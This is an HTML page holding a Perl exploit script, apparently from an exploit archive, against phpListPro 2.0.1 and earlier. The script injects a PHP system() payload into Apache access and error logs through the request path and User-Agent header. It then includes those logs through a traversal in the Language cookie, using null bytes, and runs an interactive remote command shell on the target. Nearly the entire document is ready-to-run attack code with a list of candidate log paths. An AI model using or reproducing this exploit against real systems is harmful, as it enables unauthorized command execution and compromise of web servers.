<html><head><title>phpListPro <= 2.0.1 (Language) Remote Code Execution Exploit</title></head><pre>#!/usr/bin/perl
#
# Title: phpListPro &lt;= 2.0.1 Remote Command Execution Exploit
# URL: http://www.smartisoft.com/
#
# Info: 
# - arbitrary local inclusion 
# - need magic_quotes_gpc=off
# 
#

use IO::Socket;
use LWP::Simple;

#ripped from rgod

@apache=(
  &quot;/var/log/httpd/access_log%00&quot;,
  &quot;/var/log/httpd/error_log%00&quot;,
  &quot;/var/log/apache/error.log%00&quot;,
  &quot;/var/log/apache/access.log%00&quot;,  
  &quot;/apache/logs/error.log%00&quot;,
  &quot;/apache/logs/access.log%00&quot;,
  &quot;/etc/httpd/logs/acces_log%00&quot;,
  &quot;/etc/httpd/logs/acces.log%00&quot;,
  &quot;/etc/httpd/logs/error_log%00&quot;,
  &quot;/etc/httpd/logs/error.log%00&quot;,
  &quot;/var/www/logs/access_log%00&quot;,
  &quot;/var/www/logs/access.log%00&quot;,
  &quot;/usr/local/apache/logs/access_log%00&quot;,
  &quot;/usr/local/apache/logs/access.log%00&quot;,
  &quot;/var/log/apache/access_log%00&quot;,
  &quot;/var/log/apache/access.log%00&quot;,
  &quot;/var/log/access_log%00&quot;,
  &quot;/var/www/logs/error_log%00&quot;,
  &quot;/www/logs/error.log%00&quot;,
  &quot;/usr/local/apache/logs/error_log%00&quot;,
  &quot;/usr/local/apache/logs/error.log%00&quot;,
  &quot;/var/log/apache/error_log%00&quot;,
  &quot;/var/log/apache/error.log%00&quot;,
  &quot;/var/log/access_log%00&quot;,
  &quot;/var/log/error_log%00&quot;,
);

print &quot;[i] phpListPro remote command execution exploit\n&quot;;
print &quot;[i] Need magic_quotes_gpc=off\n&quot;;
print &quot;[i] Coded by [Oo]\n\n&quot;;


if (@ARGV &lt; 3)
{
	print &quot;[*] Usage: phplistpro_exp.pl [host] [path] [apache_path]\n\n&quot;;
	print &quot;[*] Apache_Path: \n&quot;;
	$i = 0;
	while($apache[$i])
	{
		print &quot;[$i] $apache[$i]\n&quot;;
		$i++;
	}
	print &quot;\n[*] Exemple: phplistpro_exp.pl 127.0.0.1 /phplistpro/ 1\n&quot;;
	exit();
}

$serv=$ARGV[0];
$path=$ARGV[1];
$type=$ARGV[2];

print &quot;[+] Injecting some code in log files...\n&quot;;
#ripped from rgod
$CODE=&quot;&lt;?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?&gt;&quot;;
$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;[-] Connecting ... Could not connect to host.\n\n&quot;;
print $socket &quot;GET &quot;.$path.$CODE.&quot; HTTP/1.1\r\n&quot;;
print $socket &quot;User-Agent: &quot;.$CODE.&quot;\r\n&quot;;
print $socket &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
print $socket &quot;Connection: close\r\n\r\n&quot;;
close($socket);

print &quot;[+] Ok! Now here the shell, type exit to quit\n&quot;;
print &quot;[+] If it's not work maybe try another apache_path...\n\n&quot;;

print &quot;[shell] &quot;;
$cmd = &lt;STDIN&gt;;

while($cmd !~ &quot;exit&quot;)
{
	$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$serv&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;[-] Connecting ... Could not connect to host.\n\n&quot;;
	
	print $socket &quot;GET &quot;.$path.&quot;config.php HTTP/1.1\r\n&quot;;
	print $socket &quot;Host: &quot;.$serv.&quot;\r\n&quot;;
	print $socket &quot;Accept: */*\r\n&quot;;
	print $socket &quot;Cookie: Language=/../../../../../../../../../..&quot;.$apache[$type].&quot;;cmd=$cmd \r\n&quot;;
	print $socket &quot;Connection: close\r\n\n&quot;;	
	
	while ($answer = &lt;$socket&gt;)
	{
		print $answer;
	}
	
	print &quot;[shell] &quot;;
	$cmd = &lt;STDIN&gt;;	
}

# milw0rm.com [2006-05-19]</pre></html>